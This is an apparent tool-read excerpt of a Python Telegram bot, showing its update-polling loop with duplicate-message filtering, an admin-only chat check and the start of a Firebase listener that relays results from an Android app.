     1→  3000→
   437→  3436→            updates = result.get("result", [])
   438→  3437→            for update in updates:
   439→  3438→                update_id = update.get("update_id", 0)
   440→  3439→                tg_offset = update_id + 1
   441→  3440→                
   442→  3441→                # === منع تكرار معالجة نفس التحديث ===
   443→  3442→                if update_id in _processed_update_ids:
   444→  3443→                    continue
   445→  3444→                _processed_update_ids.add(update_id)
   446→  3445→                if len(_processed_update_ids) > 1000:
   447→  3446→                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
   448→  3447→                
   449→  3448→                # Handle message
   450→  3449→                if "message" in update:
   451→  3450→                    msg = update["message"]
   452→  3451→                    chat_id = msg.get("chat", {}).get("id")
   453→  3452→                    text = msg.get("text", "")
   454→  3453→                    msg_id = msg.get("message_id", 0)
   455→  3454→                    
   456→  3455→                    # === منع تكرار معالجة نفس الرسالة بالضبط ===
   457→  3456→                    msg_key = f"{chat_id}:{msg_id}"
   458→  3457→                    if msg_key in _processed_message_keys:
   459→  3458→                        continue
   460→  3459→                    _processed_message_keys.add(msg_key)
   461→  3460→                    if len(_processed_message_keys) > 500:
   462→  3461→                        _processed_message_keys = set(list(_processed_message_keys)[-200:])
   463→  3462→                    
   464→  3463→                    if chat_id != ADMIN_CHAT_ID:
   465→  3464→                        log.warning("Unauthorized access from %s", chat_id)
   466→  3465→                        continue
   467→  3466→                    
   468→  3467→                    if text.startswith("/"):
   469→  3468→                        await handle_telegram_command(chat_id, text, msg_id)
   470→  3469→                
   471→  3470→                # Handle callback query
   472→  3471→                if "callback_query" in update:
   473→  3472→                    cb = update["callback_query"]
   474→  3473→                    cb_id = cb.get("id", "")
   475→  3474→                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
   476→  3475→                    
   477→  3476→                    # === منع تكرار معالجة نفس الـ callback ===
   478→  3477→                    cb_key = f"cb:{cb_id}"
   479→  3478→                    if cb_key in _processed_message_keys:
   480→  3479→                        continue
   481→  3480→                    _processed_message_keys.add(cb_key)
   482→  3481→                    
   483→  3482→                    if cb_chat != ADMIN_CHAT_ID:
   484→  3483→                        continue
   485→  3484→                    await handle_callback_query(cb)
   486→  3485→        
   487→  3486→        except asyncio.CancelledError:
   488→  3487→            break
   489→  3488→        except Exception as exc:
   490→  3489→            log.error("Poll error: %s", exc)
   491→  3490→            await asyncio.sleep(3)
   492→  3491→
   493→  3492→# ============================================================================
   494→  3493→# FIREBASE COMMAND RESULT LISTENER
   495→  3494→# ============================================================================
   496→  3495→
   497→  3496→async def firebase_result_listener():
   498→  3497→    """Background task: Poll Firebase for results from Android app.
   499→  3498→    ACTIVE mode - forwards results to Telegram admin."""
   500→  3499→    global _processed_results
   501→
   502→[showing lines 3000-3499 of 4299; use offset=3500 with limit to continue reading]
